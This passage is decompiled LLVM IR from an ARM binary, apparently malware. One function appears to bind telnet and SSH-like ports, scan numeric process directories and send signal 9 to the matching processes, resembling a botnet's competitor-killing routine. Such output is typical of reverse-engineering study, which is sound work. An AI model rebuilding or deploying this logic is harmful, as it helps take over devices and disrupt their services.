dec_label_pc_ce7c:                                ; preds = %dec_label_pc_cb5c
  %v1_ce7c = add i32 %v0_ce7c, 1
  %v7_ce80 = icmp eq i32 %v0_ce7c, 0
  br i1 %v7_ce80, label %dec_label_pc_ce88, label %dec_label_pc_cb64

dec_label_pc_ce88:                                ; preds = %dec_label_pc_ce7c
  %v1_ce88 = add i32 %v0_cb6c, 3
  %v2_ce88 = inttoptr i32 %v1_ce88 to i8*
  %v3_ce88 = load i8, i8* %v2_ce88, align 1
  %v7_ce8c = icmp eq i8 %v3_ce88, 65
  br i1 %v7_ce8c, label %dec_label_pc_cea0, label %dec_label_pc_ce94

dec_label_pc_ce94:                                ; preds = %dec_label_pc_ce88, %dec_label_pc_cea0
  %v0_cb7482 = phi i32 [ %v0_cb7483, %dec_label_pc_ce88 ], [ 1, %dec_label_pc_cea0 ]
  br label %dec_label_pc_cb3c.backedge

dec_label_pc_cb3c.backedge:                       ; preds = %dec_label_pc_ce94, %dec_label_pc_cb68
  %v0_cb7481 = phi i32 [ %v0_cb7482, %dec_label_pc_ce94 ], [ %v0_cb7483, %dec_label_pc_cb68 ]
  %v0_ce7c73 = phi i32 [ %v1_ce7c, %dec_label_pc_ce94 ], [ %v0_cb68, %dec_label_pc_cb68 ]
  %v0_cb5c.pr70 = phi i32 [ 0, %dec_label_pc_ce94 ], [ %v0_cb5c.pr71, %dec_label_pc_cb68 ]
  %v0_cb3c = add i32 %v0_cb6c, 1
  %v1_cb3c = add i32 %v0_cb6c, 3
  %v2_cb3c = inttoptr i32 %v1_cb3c to i8*
  %v3_cb3c = load i8, i8* %v2_cb3c, align 1
  %v2_cb40 = icmp eq i8 %v3_cb3c, 0
  %v1_cb44 = add i32 %v0_cb4478, 1
  br i1 %v2_cb40, label %dec_label_pc_cb74, label %dec_label_pc_cb4c

dec_label_pc_cea0:                                ; preds = %dec_label_pc_ce88
  store i32 1, i32* @lr, align 4
  br label %dec_label_pc_ce94

dec_label_pc_cea8:                                ; preds = %dec_label_pc_cbec
  %v1_ceac = call i32 @function_fcc0(i32 15)
  %v1_ceb4 = call i32 @function_fcc0(i32 16)
  %v1_cebc = call i32 @function_fcc0(i32 17)
  %v1_cec4 = call i32 @function_fcc0(i32 19)
  br label %dec_label_pc_ce68

dec_label_pc_cecc:                                ; preds = %dec_label_pc_c964
  store i8 48, i8* %stack_var_-72, align 1
  br label %dec_label_pc_ca10

; uselistorder directives
  uselistorder i32 %v1_cb44, { 1, 0 }
  uselistorder i8 %v3_cb3c, { 1, 0 }
  uselistorder i32 %v0_cb7481, { 1, 0 }
  uselistorder i32 %v1_ce7c, { 1, 0 }
  uselistorder i32 %v2_ce30, { 1, 0 }
  uselistorder i32 %v1_cba0, { 1, 0 }
  uselistorder i32 %v0_cbac30, { 1, 0 }
  uselistorder i32 %v1_cbc4, { 0, 3, 1, 2 }
  uselistorder i32 %v0_cb68, { 1, 0 }
  uselistorder i32 %v0_cb4478, { 1, 0 }
  uselistorder i32 %v0_ce7c, { 4, 3, 0, 1, 2 }
  uselistorder i32 %v0_cb7483, { 1, 2, 0 }
  uselistorder i32 %v1_cb4454, { 1, 0 }
  uselistorder i32 %v2_cb28, { 1, 0 }
  uselistorder i32 %v1_cb24, { 3, 1, 0, 2, 4 }
  uselistorder i32 %v1_cae4, { 0, 2, 1 }
  uselistorder i32 %v0_cae416, { 1, 0 }
  uselistorder i32 %v1_cab0, { 0, 2, 3, 4, 5, 6, 1 }
  uselistorder i32 %v2_ca40, { 1, 2, 0 }
  uselistorder i32 %v0_c9e8, { 1, 0 }
  uselistorder i32 %v2_c9e4, { 1, 0, 2 }
  uselistorder i8* %v2_c9cc, { 1, 0, 2 }
  uselistorder i32 %v2_c9ac, { 1, 2, 3, 0, 4, 5 }
  uselistorder i8* %stack_var_-585, { 1, 4, 0, 2, 3 }
  uselistorder i8* %stack_var_-72, { 2, 0, 1 }
  uselistorder i32* %stack_var_-56, { 0, 1, 2, 4, 3 }
  uselistorder i32 (i8*, i32, i32)* @function_10578, { 1, 0 }
  uselistorder label %dec_label_pc_ce94, { 1, 0 }
  uselistorder label %dec_label_pc_ce68, { 1, 2, 0 }
  uselistorder label %dec_label_pc_ce48, { 1, 0 }
  uselistorder label %dec_label_pc_ce3c, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_ce24, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_cd34, { 1, 0 }
  uselistorder label %dec_label_pc_cd34thread-pre-split, { 1, 0 }
  uselistorder label %dec_label_pc_cd1c.loopexit, { 1, 0 }
  uselistorder label %dec_label_pc_cc38, { 1, 0 }
  uselistorder label %dec_label_pc_cc38.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_cc28.loopexit, { 2, 1, 0 }
  uselistorder label %dec_label_pc_cbc0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_cb68, { 2, 0, 1 }
  uselistorder label %dec_label_pc_cb4c, { 1, 0 }
  uselistorder label %dec_label_pc_caf0, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_ca54.backedge, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_caa4, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_ca6c, { 1, 0 }
  uselistorder label %dec_label_pc_ca10, { 1, 0 }
}

define i32 @function_cef8(i32 %arg1) local_unnamed_addr {
dec_label_pc_cef8:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-8404 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-212 = alloca i32, align 4
  %stack_var_-148 = alloca i32, align 4
  %stack_var_-84 = alloca i32, align 4
  %stack_var_-4264 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-232 = alloca i32, align 4
  %v3_cef8 = load i32, i32* @r4, align 4
  %v6_cef8 = load i32, i32* @r5, align 4
  %v9_cef8 = load i32, i32* @r6, align 4
  %v12_cef8 = load i32, i32* @r7, align 4
  %v15_cef8 = load i32, i32* @r8, align 4
  %v18_cef8 = load i32, i32* @sb, align 4
  %v21_cef8 = load i32, i32* @sl, align 4
  %v24_cef8 = load i32, i32* @fp, align 4
  %v27_cef8 = load i32, i32* @lr, align 4
  %v2_cf08 = call i32 @function_10a58(i32* null)
  store i32 %v2_cf08, i32* @r0, align 4
  store i32 %v2_cf08, i32* @r7, align 4
  %v0_cf10 = call i32 @function_10ac8()
  %v7_cf14 = icmp eq i32 %v0_cf10, -1
  %. = zext i1 %v7_cf14 to i32
  %tmp157 = icmp slt i32 %v0_cf10, 1
  %storemerge126 = select i1 %tmp157, i32 %., i32 1
  store i32 %storemerge126, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_20a54.58 to i32), i32* %r3.global-to-local, align 4
  %v2_cf30 = icmp eq i32 %storemerge126, 0
  store i32 %v0_cf10, i32* @global_var_20a54.58, align 4
  br i1 %v2_cf30, label %dec_label_pc_cf4c, label %dec_label_pc_cf3c

dec_label_pc_cf3c:                                ; preds = %dec_label_pc_d1b4, %dec_label_pc_d09c, %dec_label_pc_cef8
  %v1_cf48 = phi i32 [ %v2_d150, %dec_label_pc_d09c ], [ %v0_cf10, %dec_label_pc_cef8 ], [ 0, %dec_label_pc_d1b4 ]
  store i32 %v3_cef8, i32* @r4, align 4
  store i32 %v6_cef8, i32* @r5, align 4
  store i32 %v9_cef8, i32* @r6, align 4
  store i32 %v12_cef8, i32* @r7, align 4
  store i32 %v15_cef8, i32* @r8, align 4
  store i32 %v18_cef8, i32* @sb, align 4
  store i32 %v21_cef8, i32* @sl, align 4
  store i32 %v24_cef8, i32* @fp, align 4
  store i32 %v27_cef8, i32* @lr, align 4
  ret i32 %v1_cf48

dec_label_pc_cf4c:                                ; preds = %dec_label_pc_cef8
  %v2_cf4c = ptrtoint i32* %stack_var_-232 to i32
  store i32 %v2_cf4c, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 2, i32* %stack_var_-68, align 4
  %v1_cf60 = call i32 @function_c964(i32 5888)
  store i32 %v2_cf4c, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_cf74 = load i32, i32* @r5, align 4
  store i32 %v0_cf74, i32* %r2.global-to-local, align 4
  %v3_cf7c = call i32 @function_115e4(i32 2, i32 1, i32 %v0_cf74)
  %v7_cf80 = icmp eq i32 %v3_cf7c, -1
  store i32 %v3_cf7c, i32* @r4, align 4
  br i1 %v7_cf80, label %dec_label_pc_cfa8, label %dec_label_pc_cf8c

dec_label_pc_cf8c:                                ; preds = %dec_label_pc_cf4c
  %v2_cf90 = ptrtoint i32* %stack_var_-68 to i32
  store i32 %v2_cf90, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_cf98 = call i32 @function_11394(i32 %v3_cf7c, i32 %v2_cf90, i32 16)
  %v0_cf9c = load i32, i32* @r4, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_cfa4 = call i32 @function_11480(i32 %v0_cf9c, i32 1)
  br label %dec_label_pc_cfa8

dec_label_pc_cfa8:                                ; preds = %dec_label_pc_cf4c, %dec_label_pc_cf8c
  %v1_cfac = call i32 @function_c964(i32 5632)
  store i32 %v2_cf4c, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_cfc0 = load i32, i32* @r5, align 4
  store i32 %v0_cfc0, i32* %r2.global-to-local, align 4
  %v3_cfc8 = call i32 @function_115e4(i32 2, i32 1, i32 %v0_cfc0)
  %v7_cfcc = icmp eq i32 %v3_cfc8, -1
  store i32 %v3_cfc8, i32* @r4, align 4
  br i1 %v7_cfcc, label %dec_label_pc_cff4, label %dec_label_pc_cfd8

dec_label_pc_cfd8:                                ; preds = %dec_label_pc_cfa8
  %v2_cfdc = ptrtoint i32* %stack_var_-68 to i32
  store i32 %v2_cfdc, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_cfe4 = call i32 @function_11394(i32 %v3_cfc8, i32 %v2_cfdc, i32 16)
  %v0_cfe8 = load i32, i32* @r4, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_cff0 = call i32 @function_11480(i32 %v0_cfe8, i32 1)
  br label %dec_label_pc_cff4

dec_label_pc_cff4:                                ; preds = %dec_label_pc_cfa8, %dec_label_pc_cfd8
  %v1_cffc = call i32 @function_c964(i32 58811)
  store i32 -6725, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_d014 = load i32, i32* @r5, align 4
  store i32 %v0_d014, i32* %r2.global-to-local, align 4
  %v3_d01c = call i32 @function_115e4(i32 2, i32 1, i32 %v0_d014)
  %v7_d020 = icmp eq i32 %v3_d01c, -1
  store i32 %v3_d01c, i32* @r4, align 4
  br i1 %v7_d020, label %dec_label_pc_d048, label %dec_label_pc_d02c

dec_label_pc_d02c:                                ; preds = %dec_label_pc_cff4
  %v2_d030 = ptrtoint i32* %stack_var_-68 to i32
  store i32 %v2_d030, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_d038 = call i32 @function_11394(i32 %v3_d01c, i32 %v2_d030, i32 16)
  %v0_d03c = load i32, i32* @r4, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_d044 = call i32 @function_11480(i32 %v0_d03c, i32 1)
  br label %dec_label_pc_d048

dec_label_pc_d048:                                ; preds = %dec_label_pc_cff4, %dec_label_pc_d02c
  %v1_d050 = call i32 @function_c964(i32 50951)
  store i32 -14585, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_d068 = load i32, i32* @r5, align 4
  store i32 %v0_d068, i32* %r2.global-to-local, align 4
  %v3_d070 = call i32 @function_115e4(i32 2, i32 1, i32 %v0_d068)
  %v7_d074 = icmp eq i32 %v3_d070, -1
  store i32 %v3_d070, i32* @r4, align 4
  br i1 %v7_d074, label %dec_label_pc_d09c, label %dec_label_pc_d080

dec_label_pc_d080:                                ; preds = %dec_label_pc_d048
  %v2_d084 = ptrtoint i32* %stack_var_-68 to i32
  store i32 %v2_d084, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_d08c = call i32 @function_11394(i32 %v3_d070, i32 %v2_d084, i32 16)
  %v0_d090 = load i32, i32* @r4, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_d098 = call i32 @function_11480(i32 %v0_d090, i32 1)
  br label %dec_label_pc_d09c

dec_label_pc_d09c:                                ; preds = %dec_label_pc_d048, %dec_label_pc_d080
  %v1_d0a0 = call i32 @function_12ef0(i32 5)
  store i32 4096, i32* @r0, align 4
  %v0_d0a8 = call i32 @function_1182c()
  store i32 ptrtoint (i32* @global_var_1e9c8.63 to i32), i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_20a50.65 to i32), i32* %r1.global-to-local, align 4
  store i32 %v0_d0a8, i32* %r2.global-to-local, align 4
  %v0_d0b8 = load i32, i32* @r5, align 4
  %v1_d0b8 = trunc i32 %v0_d0b8 to i8
  %v3_d0b8 = inttoptr i32 %v0_d0a8 to i8*
  store i8 %v1_d0b8, i8* %v3_d0b8, align 1
  %v0_d0c0 = load i32, i32* @r5, align 4
  %v1_d0c0 = load i32, i32* %r3.global-to-local, align 4
  %v2_d0c0 = inttoptr i32 %v1_d0c0 to i32*
  store i32 %v0_d0c0, i32* %v2_d0c0, align 4
  %v0_d0c4 = load i32, i32* %r2.global-to-local, align 4
  %v1_d0c4 = load i32, i32* %r1.global-to-local, align 4
  %v2_d0c4 = inttoptr i32 %v1_d0c4 to i32*
  store i32 %v0_d0c4, i32* %v2_d0c4, align 4
  %v1_d0c8 = call i32 @function_fd60(i32 15)
  %v1_d0d0 = call i32 @function_fd60(i32 16)
  %v2_d0d4 = ptrtoint i32* %stack_var_-4264 to i32
  store i32 %v2_d0d4, i32* %r2.global-to-local, align 4
  %v0_d0d8 = load i32, i32* @r5, align 4
  store i32 %v0_d0d8, i32* %r1.global-to-local, align 4
  %v2_d0e4 = inttoptr i32 %v0_d0d8 to i32*
  %v3_d0e4 = call i32 @function_fc9c(i32 15, i32* %v2_d0e4)
  %v1_d0ec = add i32 %v2_d0d4, -44
  store i32 %v1_d0ec, i32* %r3.global-to-local, align 4
  store i32 %v3_d0e4, i32* %r1.global-to-local, align 4
  store i32 %v1_d0ec, i32* @r0, align 4
  %v2_d0fc = inttoptr i32 %v1_d0ec to i8*
  %v3_d0fc = call i32 @function_10340(i8* %v2_d0fc, i32 %v3_d0e4)
  store i32 %v3_d0fc, i32* @r0, align 4
  %v2_d104 = add i32 %v3_d0fc, %v1_d0ec
  store i32 %v2_d104, i32* @r4, align 4
  %v0_d108 = call i32 @function_10a44()
  %v2_d110 = ptrtoint i32* %stack_var_-84 to i32
  store i32 %v2_d110, i32* %r2.global-to-local, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  %v3_d118 = trunc i32 %v0_d108 to i8
  %v4_d118 = call i32 @function_10778(i8 %v3_d118, i32 10, i32 %v2_d110)
  store i32 %v4_d118, i32* %r1.global-to-local, align 4
  %v0_d120 = load i32, i32* @r4, align 4
  store i32 %v0_d120, i32* @r0, align 4
  %v2_d124 = inttoptr i32 %v0_d120 to i8*
  %v3_d124 = call i32 @function_10340(i8* %v2_d124, i32 %v4_d118)
  %v0_d128 = load i32, i32* @r5, align 4
  store i32 %v0_d128, i32* %r1.global-to-local, align 4
  %v1_d12c = load i32, i32* @r4, align 4
  %v2_d12c = add i32 %v1_d12c, %v3_d124
  store i32 %v2_d12c, i32* @r4, align 4
  %v2_d134 = inttoptr i32 %v0_d128 to i32*
  %v3_d134 = call i32 @function_fc9c(i32 16, i32* %v2_d134)
  store i32 %v3_d134, i32* %r1.global-to-local, align 4
  %v0_d13c = load i32, i32* @r4, align 4
  store i32 %v0_d13c, i32* @r0, align 4
  %v2_d140 = inttoptr i32 %v0_d13c to i8*
  %v3_d140 = call i32 @function_10340(i8* %v2_d140, i32 %v3_d134)
  %v0_d144 = load i32, i32* @r5, align 4
  store i32 %v0_d144, i32* %r1.global-to-local, align 4
  store i32 %v3_d140, i32* @r6, align 4
  %v2_d150 = call i32 @function_109e4(i32 %v1_d0ec, i32 %v0_d144)
  %v7_d154 = icmp eq i32 %v2_d150, -1
  br i1 %v7_d154, label %dec_label_pc_cf3c, label %dec_label_pc_d15c

dec_label_pc_d15c:                                ; preds = %dec_label_pc_d09c
  %v1_d15c = call i32 @function_10dd8(i32 %v2_d150)
  %v1_d164 = call i32 @function_fcc0(i32 15)
  %v1_d16c = call i32 @function_fcc0(i32 16)
  store i32 ptrtoint (i32* @global_var_20a50.65 to i32), i32* %r3.global-to-local, align 4
  %v2_d178 = load i32, i32* @global_var_20a50.65, align 4
  store i32 %v2_d178, i32* %r1.global-to-local, align 4
  store i32 4095, i32* %r2.global-to-local, align 4
  %v3_d184 = call i32 @function_10b3c(i32 %v1_d0ec, i32 %v2_d178, i32 4095)
  %v7_d188 = icmp eq i32 %v3_d184, -1
  br i1 %v7_d188, label %.thread9, label %bb160

bb160:                                            ; preds = %dec_label_pc_d15c
  store i32 ptrtoint (i32* @global_var_20a50.65 to i32), i32* @ip, align 4
  %v3_d190 = load i32, i32* @global_var_20a50.65, align 4
  store i32 %v3_d190, i32* %r3.global-to-local, align 4
  %v1_d194 = load i32, i32* @r5, align 4
  %v2_d194 = trunc i32 %v1_d194 to i8
  %v5_d194 = add i32 %v3_d190, %v3_d184
  %v6_d194 = inttoptr i32 %v5_d194 to i8*
  store i8 %v2_d194, i8* %v6_d194, align 1
  br label %.thread9

.thread9:                                         ; preds = %dec_label_pc_d15c, %bb160
  store i32 %v1_d0ec, i32* @r0, align 4
  %v0_d19c = load i32, i32* @r6, align 4
  %v1_d19c = load i32, i32* @r4, align 4
  %v1_d0ec.neg = sub i32 44, %v2_d0d4
  %v2_d19c = add i32 %v1_d0ec.neg, %v0_d19c
  %v2_d1a0 = add i32 %v2_d19c, %v1_d19c
  store i32 %v2_d1a0, i32* @r1, align 4
  %v0_d1a4 = call i32 @function_103ac()
  %v0_d1a8 = load i32, i32* @r7, align 4
  store i32 %v0_d1a8, i32* @r4, align 4
  %v0_d1ac = load i32, i32* @r5, align 4
  store i32 400, i32* @r5, align 4
  %v2_d2b8 = ptrtoint i32* %stack_var_-148 to i32
  %v2_d2bc = bitcast i32* %stack_var_-148 to i8*
  %v2_d308 = ptrtoint i32* %stack_var_-212 to i32
  %v2_d30c = bitcast i32* %stack_var_-212 to i8*
  %v2_d468 = ptrtoint i32* %stack_var_-44 to i32
  %v2_d478 = ptrtoint i32* %stack_var_-48 to i32
  %v2_d490 = ptrtoint i32* %stack_var_-52 to i32
  %v2_d4a4 = ptrtoint i32* %stack_var_-8404 to i32
  br label %dec_label_pc_d1b4

dec_label_pc_d1b4:                                ; preds = %dec_label_pc_d27c, %.thread9
  %stack_var_-8412.0 = phi i32 [ %v0_d1ac, %.thread9 ], [ %stack_var_-8412.3, %dec_label_pc_d27c ]
  %v1_d1b8 = call i32 @function_fd60(i32 15)
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_d1c4 = call i32 @function_fc9c(i32 15, i32* null)
  %v1_d1c8 = call i32 @function_10fd4(i32 %v3_d1c4)
  store i32 %v1_d1c8, i32* @sb, align 4
  %v2_d1cc = icmp eq i32 %v1_d1c8, 0
  br i1 %v2_d1cc, label %dec_label_pc_cf3c, label %dec_label_pc_d1d4

dec_label_pc_d1d4:                                ; preds = %dec_label_pc_d1b4
  %v1_d1d8 = call i32 @function_fcc0(i32 15)
  %v0_d1dc80 = load i32, i32* @sb, align 4
  %v1_d1e081 = inttoptr i32 %v0_d1dc80 to i32*
  %v2_d1e082 = call i32 @function_11118(i32* %v1_d1e081)
  %v2_d1e484 = icmp eq i32 %v2_d1e082, 0
  br i1 %v2_d1e484, label %dec_label_pc_d27c, label %dec_label_pc_d1ec.preheader

dec_label_pc_d1ec.preheader:                      ; preds = %dec_label_pc_d1d4, %dec_label_pc_d1dc.backedge
  %v0_d1ec93 = phi i32 [ %v2_d1e0, %dec_label_pc_d1dc.backedge ], [ %v2_d1e082, %dec_label_pc_d1d4 ]
  %stack_var_-8412.185 = phi i32 [ %stack_var_-8412.1.be, %dec_label_pc_d1dc.backedge ], [ %stack_var_-8412.0, %dec_label_pc_d1d4 ]
  br label %dec_label_pc_d1ec

dec_label_pc_d1ec:                                ; preds = %dec_label_pc_d1ec.preheader, %dec_label_pc_d264
  %v0_d1fc = phi i32 [ %v2_d270, %dec_label_pc_d264 ], [ %v0_d1ec93, %dec_label_pc_d1ec.preheader ]
  %stack_var_-8412.2 = phi i32 [ %v1_d210, %dec_label_pc_d264 ], [ %stack_var_-8412.185, %dec_label_pc_d1ec.preheader ]
  %v1_d1ec = add i32 %v0_d1fc, 11
  %v2_d1ec = inttoptr i32 %v1_d1ec to i8*
  %v3_d1ec = load i8, i8* %v2_d1ec, align 1
  %v4_d1ec = zext i8 %v3_d1ec to i32
  %v1_d1f0 = add nsw i32 %v4_d1ec, -48
  store i32 %v1_d1f0, i32* %r3.global-to-local, align 4
  %tmp = icmp ugt i32 %v1_d1f0, 9
  br i1 %tmp, label %dec_label_pc_d1dc.backedge, label %dec_label_pc_d1fc

dec_label_pc_d1fc:                                ; preds = %dec_label_pc_d1ec
  store i32 %v1_d1ec, i32* @r6, align 4
  store i32 %v1_d1ec, i32* @r0, align 4
  %v1_d204 = call i32 @function_12c3c(i32 %v1_d1ec)
  %v0_d20c = load i32, i32* @r5, align 4
  %v1_d210 = add i32 %stack_var_-8412.2, 1
  store i32 %v1_d210, i32* %r1.global-to-local, align 4
  store i32 %v1_d204, i32* @r7, align 4
  %v5_d21c = icmp slt i32 %v0_d20c, %v1_d204
  %v2_d28c = call i32 @function_10a58(i32* null)
  br i1 %v5_d21c, label %dec_label_pc_d288, label %dec_label_pc_d220

dec_label_pc_d220:                                ; preds = %dec_label_pc_d1fc
  %v0_d228 = load i32, i32* @r4, align 4
  %v2_d228 = sub i32 %v2_d28c, %v0_d228
  %v7_d230 = icmp slt i32 %v2_d228, 601
  br i1 %v7_d230, label %dec_label_pc_d238, label %.thread10

.thread10:                                        ; preds = %dec_label_pc_d220
  store i32 400, i32* @r5, align 4
  br label %dec_label_pc_d1dc.backedge

dec_label_pc_d238:                                ; preds = %dec_label_pc_d220
  %v0_d238 = load i32, i32* @r7, align 4
  %v7_d23c = icmp slt i32 %v0_d238, 401
  br i1 %v7_d23c, label %dec_label_pc_d1dc.backedge, label %dec_label_pc_d240

dec_label_pc_d240:                                ; preds = %dec_label_pc_d238
  %v3_d248 = zext i32 %v1_d210 to i64
  %v4_d248 = mul nuw i64 %v3_d248, 3435973837
  %v3_d24c1 = udiv i64 %v4_d248, 34359738368
  %v3_d2503 = mul nuw nsw i64 %v3_d24c1, 8
  %v3_d250 = trunc i64 %v3_d2503 to i32
  store i32 %v3_d250, i32* %r3.global-to-local, align 4
  %v2_d2545 = mul nuw nsw i64 %v3_d24c1, 2
  %v2_d254 = trunc i64 %v2_d2545 to i32
  %v2_d258 = add i32 %v3_d250, %v2_d254
  store i32 %v2_d258, i32* %r2.global-to-local, align 4
  %v9_d25c = icmp eq i32 %v1_d210, %v2_d258
  br i1 %v9_d25c, label %dec_label_pc_d264, label %dec_label_pc_d1dc.backedge

dec_label_pc_d264:                                ; preds = %dec_label_pc_d240
  %v1_d268 = call i32 @function_12ef0(i32 1)
  %v0_d26c = load i32, i32* @sb, align 4
  %v1_d270 = inttoptr i32 %v0_d26c to i32*
  %v2_d270 = call i32 @function_11118(i32* %v1_d270)
  %v2_d274 = icmp eq i32 %v2_d270, 0
  br i1 %v2_d274, label %dec_label_pc_d27c, label %dec_label_pc_d1ec

dec_label_pc_d27c:                                ; preds = %dec_label_pc_d1dc.backedge, %dec_label_pc_d264, %dec_label_pc_d1d4
  %stack_var_-8412.3 = phi i32 [ %stack_var_-8412.0, %dec_label_pc_d1d4 ], [ %v1_d210, %dec_label_pc_d264 ], [ %stack_var_-8412.1.be, %dec_label_pc_d1dc.backedge ]
  %v0_d27c = load i32, i32* @sb, align 4
  %v1_d280 = inttoptr i32 %v0_d27c to i32*
  %v2_d280 = call i32 @function_10e0c(i32* %v1_d280)
  br label %dec_label_pc_d1b4

dec_label_pc_d288:                                ; preds = %dec_label_pc_d1fc
  %v1_d298 = call i32 @function_fd60(i32 15)
  %v1_d2a0 = call i32 @function_fd60(i32 16)
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_d2ac = call i32 @function_fc9c(i32 15, i32* null)
  store i32 %v3_d2ac, i32* %r1.global-to-local, align 4
  store i32 %v2_d2b8, i32* @r0, align 4
  %v3_d2bc = call i32 @function_10340(i8* %v2_d2bc, i32 %v3_d2ac)
  %v2_d2c8 = add i32 %v3_d2bc, %v2_d2b8
  store i32 %v2_d2c8, i32* %r5.global-to-local, align 4
  store i32 %v2_d2c8, i32* @r0, align 4
  %v0_d2d0 = load i32, i32* @r6, align 4
  store i32 %v0_d2d0, i32* %r1.global-to-local, align 4
  %v2_d2d4 = inttoptr i32 %v2_d2c8 to i8*
  %v3_d2d4 = call i32 @function_10340(i8* %v2_d2d4, i32 %v0_d2d0)
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_d2e4 = call i32 @function_fc9c(i32 16, i32* null)
  store i32 %v3_d2e4, i32* %r1.global-to-local, align 4
  %v1_d2ec = load i32, i32* %r5.global-to-local, align 4
  %v2_d2ec = add i32 %v1_d2ec, %v3_d2d4
  store i32 %v2_d2ec, i32* @r0, align 4
  %v2_d2f0 = inttoptr i32 %v2_d2ec to i8*
  %v3_d2f0 = call i32 @function_10340(i8* %v2_d2f0, i32 %v3_d2e4)
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_d2fc = call i32 @function_fc9c(i32 15, i32* null)
  store i32 %v3_d2fc, i32* %r1.global-to-local, align 4
  store i32 %v2_d308, i32* @r0, align 4
  %v3_d30c = call i32 @function_10340(i8* %v2_d30c, i32 %v3_d2fc)
  store i32 %v2_d308, i32* %r2.global-to-local, align 4
  %v2_d318 = add i32 %v3_d30c, %v2_d308
  store i32 %v2_d318, i32* @r5, align 4
  %v0_d31c = load i32, i32* @r6, align 4
  store i32 %v0_d31c, i32* %r1.global-to-local, align 4
  store i32 %v2_d318, i32* @r0, align 4
  %v2_d324 = inttoptr i32 %v2_d318 to i8*
  %v3_d324 = call i32 @function_10340(i8* %v2_d324, i32 %v0_d31c)
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v3_d324, i32* @r4, align 4
  %v3_d334 = call i32 @function_fc9c(i32 32, i32* null)
  store i32 %v3_d334, i32* %r1.global-to-local, align 4
  %v0_d33c = load i32, i32* @r4, align 4
  %v1_d33c = load i32, i32* @r5, align 4
  %v2_d33c = add i32 %v1_d33c, %v0_d33c
  store i32 %v2_d33c, i32* @r0, align 4
  %v2_d340 = inttoptr i32 %v2_d33c to i8*
  %v3_d340 = call i32 @function_10340(i8* %v2_d340, i32 %v3_d334)
  %v1_d348 = call i32 @function_fcc0(i32 15)
  %v1_d350 = call i32 @function_fcc0(i32 16)
  store i32 %v1_d0ec, i32* %r1.global-to-local, align 4
  store i32 4095, i32* @r2, align 4
  %v3_d368 = call i32 @function_10b3c(i32 %v2_d2b8, i32 %v1_d0ec, i32 4095)
  %v7_d36c = icmp eq i32 %v3_d368, -1
  store i32 %v3_d368, i32* @r5, align 4
  br i1 %v7_d36c, label %dec_label_pc_d430, label %dec_label_pc_d378

dec_label_pc_d378:                                ; preds = %dec_label_pc_d288
  store i32 %v1_d0ec, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v4_d380 = add i32 %v3_d368, %v1_d0ec
  %v5_d380 = inttoptr i32 %v4_d380 to i8*
  store i8 0, i8* %v5_d380, align 1
  %v1_d388 = call i32 @function_fd60(i32 33)
  %v0_d38c = load i32, i32* @r4, align 4
  store i32 %v0_d38c, i32* %r1.global-to-local, align 4
  %v2_d394 = inttoptr i32 %v0_d38c to i32*
  %v3_d394 = call i32 @function_fc9c(i32 33, i32* %v2_d394)
  %v0_d398 = load i32, i32* @r5, align 4
  %v1_d398 = add i32 %v0_d398, -1
  store i32 %v1_d398, i32* @r1, align 4
  store i32 %v3_d394, i32* %r2.global-to-local, align 4
  %v4_d3a4 = call i32 @function_10668(i8* %v2_d0fc, i32 %v1_d398, i32 %v3_d394)
  %v7_d3a8 = icmp eq i32 %v4_d3a4, -1
  br i1 %v7_d3a8, label %dec_label_pc_d3c4, label %dec_label_pc_d3b0

dec_label_pc_d3b0:                                ; preds = %dec_label_pc_d378
  %v1_d3b4 = call i32 @function_109b0(i32 %v1_d0ec)
  %v0_d3b8 = load i32, i32* @r7, align 4
  store i32 9, i32* %r1.global-to-local, align 4
  %v2_d3c0 = call i32 @function_10ba4(i32 %v0_d3b8, i32 9)
  br label %dec_label_pc_d3c4

dec_label_pc_d3c4:                                ; preds = %dec_label_pc_d378, %dec_label_pc_d3b0
  %v1_d3c8 = call i32 @function_fcc0(i32 33)
  store i32 %v1_d3c8, i32* @r0, align 4
  %v0_d3cc = call i32 @function_10a44()
  store i32 %v0_d3cc, i32* @r0, align 4
  %v1_d3d0 = load i32, i32* @r7, align 4
  %v9_d3d0 = icmp eq i32 %v0_d3cc, %v1_d3d0
  br i1 %v9_d3d0, label %dec_label_pc_d3fc, label %dec_label_pc_d3d8

